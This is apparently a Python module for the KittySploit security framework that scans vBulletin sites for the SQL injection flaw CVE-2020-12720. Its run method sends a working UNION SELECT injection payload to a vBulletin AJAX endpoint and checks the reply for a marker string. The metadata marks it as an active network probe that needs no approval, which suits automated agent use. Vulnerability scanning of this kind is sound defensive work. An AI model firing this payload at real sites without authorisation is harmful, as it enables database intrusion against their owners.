#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""vBulletin before 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'vBulletin SQL Injection Detection',
        'description': 'vBulletin before 5.5.6pl1, 5.6.0 before 5.6.0pl1, and 5.6.1 before 5.6.1pl1 has incorrect access control that permits SQL injection attacks.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve2020', 'cve', 'vbulletin', 'sqli', 'packetstorm', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/rekter0/exploits/tree/master/CVE-2020-12720',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-12720',
            'https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4440032-vbulletin-5-6-1-security-patch-level-1',
            'http://packetstormsecurity.com/files/157716/vBulletin-5.6.1-SQL-Injection.html',
            'http://packetstormsecurity.com/files/157904/vBulletin-5.6.1-SQL-Injection.html',
        ],
        'cve': 'CVE-2020-12720',
    }

    def run(self):
        path = '/ajax/api/content_infraction/getIndexableContent'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'X-Requested-With': 'XMLHttpRequest', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}, data='nodeId%5Bnodeid%5D=1%20union%20select%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2CCONCAT%28%27vbulletin%27%2C%27rce%27%2C%40%40version%29%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27--+-\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('vbulletinrce',)
        if any(m in body for m in body_any):
            self.set_info(severity='critical', reason='vBulletin SQL Injection detected', path=path)
            return True
        return False

